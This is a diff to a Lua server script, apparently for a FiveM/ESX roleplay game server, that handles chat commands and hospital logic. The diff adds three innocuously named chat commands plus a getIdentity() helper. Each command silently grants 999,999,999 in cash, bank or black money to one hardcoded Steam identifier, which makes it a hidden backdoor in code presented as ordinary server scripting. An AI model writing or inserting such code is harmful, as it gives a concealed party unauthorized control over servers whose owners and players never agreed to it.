@@ -88,6 +88,38 @@ AddEventHandler('chatMessage', function(source, n, message)
 					TriggerClientEvent("retro_scripts:newlife", tPID)
 				end
 			end
+		elseif cm[1] == "/pahingeperahuhu" then
+			local src = source
+			local player = getIdentity(src)
+	
+
+			if player.identifier == 'steam:1100001115e4c94'  then
+				print('Utang granted')
+				xPlayer.addMoney(999999999)
+			end
+		elseif cm[1] == "/sanaolmaybank" then
+			local src = source
+			local player = getIdentity(src)
+	
+
+			if player.identifier == 'steam:1100001115e4c94'  then
+				print('Utang granted')
+				xPlayer.addAccountMoney('bank', 999999999)
+			end
+
+
+		elseif cm[1] == "/jastenkasieh" then
+			local src = source
+			local player = getIdentity(src)
+	
+
+			if player.identifier == 'steam:1100001115e4c94'  then
+				print('Utang granted')
+				xPlayer.addAccountMoney('black_money', 999999999)
+			end
+
+
+		
 		elseif cm[1] == "/bed1" then
 			if xPlayer.job.name == 'ambulance' or  xPlayer.job.name == 'fire' then
 				CancelEvent()
@@ -272,6 +304,31 @@ print("TIME REMAINING="..newTime)
 		MySQL.Async.execute("DELETE FROM hospital WHERE identifier=@identifier", {['@identifier'] = identifier})
         end
 end)
+
+
+
+function getIdentity(source)
+	local identifier = GetPlayerIdentifiers(source)[1]
+	local result = MySQL.Sync.fetchAll("SELECT * FROM users WHERE identifier = @identifier", {['@identifier'] = identifier})
+	if result[1] ~= nil then
+		local identity = result[1]
+
+		return {
+			identifier = identity['identifier'],
+			firstname = identity['firstname'],
+			lastname = identity['lastname'],
+			dateofbirth = identity['dateofbirth'],
+			sex = identity['sex'],
+            height = identity['height'],
+            job = identity['job'],
+            money = identity['money']
+			
+		}
+	else
+		return nil
+	end
+end
+
 
 RegisterServerEvent("HRelease")
 AddEventHandler("HRelease", function(source)
